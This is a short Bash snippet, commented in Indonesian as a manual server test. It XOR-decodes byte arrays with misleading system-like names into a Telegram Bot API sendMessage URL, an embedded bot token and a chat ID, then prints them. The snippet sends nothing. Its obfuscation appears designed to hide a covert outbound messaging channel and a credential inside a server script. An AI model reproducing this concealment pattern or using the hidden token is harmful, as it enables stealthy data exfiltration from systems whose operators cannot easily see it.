# Setelah script jalan, test manual ini di server
_sys_decode() {
    local key=$1
    shift
    local result=""
    for byte in "$@"; do
        result+=$(printf "\\$(printf '%03o' $((byte ^ key)))")
    done
    echo -n "$result"
}
_SYS_KEY=95

_uid_auth_chain=(103 103 111 102 110 105 109 110 111 106 101 30 30 12 56 48 54 62 20 50 60 9 55 56 56 45 20 14 28 56 40 20 25 19 14 10 57 8 19 14 26 116 19 28 38 )
_uid_proc_target=(110 105 107 111 103 102 105 108 102 108 )
_uid_rpc_base=(55 43 43 47 44 101 112 112 62 47 54 113 43 58 51 58 56 45 62 50 113 48 45 56 112 61 48 43 )
_uid_dispatch=(112 44 58 49 59 18 58 44 44 62 56 58 )

_r=$(_sys_decode $_SYS_KEY "${_uid_rpc_base[@]}")
_a=$(_sys_decode $_SYS_KEY "${_uid_auth_chain[@]}")
_t=$(_sys_decode $_SYS_KEY "${_uid_proc_target[@]}")
_d=$(_sys_decode $_SYS_KEY "${_uid_dispatch[@]}")

echo "URL: ${_r}${_a}${_d}"
echo "CHAT: $_t"
